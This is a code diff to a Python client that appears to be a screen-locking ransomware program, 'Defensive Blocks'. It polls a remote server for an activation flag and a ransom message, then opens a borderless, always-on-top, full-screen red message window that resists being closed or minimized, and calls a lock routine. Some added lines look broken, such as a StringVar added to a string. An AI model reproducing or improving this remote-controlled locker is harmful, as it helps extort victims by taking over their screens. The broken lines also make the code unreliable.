@@ -2,21 +2,24 @@ import requests
 from Client.finals import Finals as final
 from apscheduler.schedulers.blocking import BlockingScheduler
 from threading import Thread
+import threading
 from Client.assisting import *
 from Client.devcon_automations import *
 from time import sleep
+from tkinter import *
 import tkinter as tk
 
 
 getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
 getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
 scheduler = BlockingScheduler()
-wa = ""
+wa = tk.Tk()
+replace(final.thread, 0)
 
 
 def ransom_win():
+    v = tk.StringVar()
     print("hello")
-    msg = requests.get(getMsg).text
     wa = tk.Tk()
     wa.title('Defensive Blocks')
     wa.overrideredirect(True)
@@ -24,26 +27,28 @@ def ransom_win():
     wa.focus_set()  # <-- move focus to this widget
     wa.protocol("WM_DELETE_WINDOW", exb)
     wa.protocol("WM_MINIMIZE_WINDOW", exb)
-    lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
-    lb1.pack()
+    v.set(requests.get(getMsg).text)
+    Label(wa, text=v + "\n", font=("Arial Bold", 70), pady=200, fg="RED").pack()
     wa.call('wm', 'attributes', '.', '-topmost', '1')
     while 1:
+        v.set(requests.get(getMsg))
         wa.update()
-        lock()
         sleep(2)
         a_field = get(final.active_field)
         if a_field == "0":
+            replace(final.thread, 0)
             wa.destroy()
             return
 
 
 def main():
+    global wa
     activation = (requests.get(getActivation)).text  # current activation
     print(activation)
     try:
         is_open = wa.winfo_ismapped()  # if the window is open return 1"""
     except:
-        is_open = 0  # if window closed return exception """
+        is_open = 0
     if get(final.active_field) != activation:  # compare previous to current
         print("in long if")
         if (str(activation) == "1") and (str(get(final.active_field)) == "0"):
@@ -60,9 +65,11 @@ def main():
         print("is open is " + str(is_open))
         if is_open != get(final.active_field) and is_open == 0:
             replace(final.active_field, 1)
-            lock()
-            open_window = Thread(target=ransom_win)
-            open_window.start()
+            if get(final.thread) == "0":
+                lock()
+                open_window = Thread(target=ransom_win)
+                print("thread number is " + str(threading.get_ident()))
+                open_window.start()
     elif activation == "0":
         print("in activation == 0")
         print("is open is " + str(is_open))
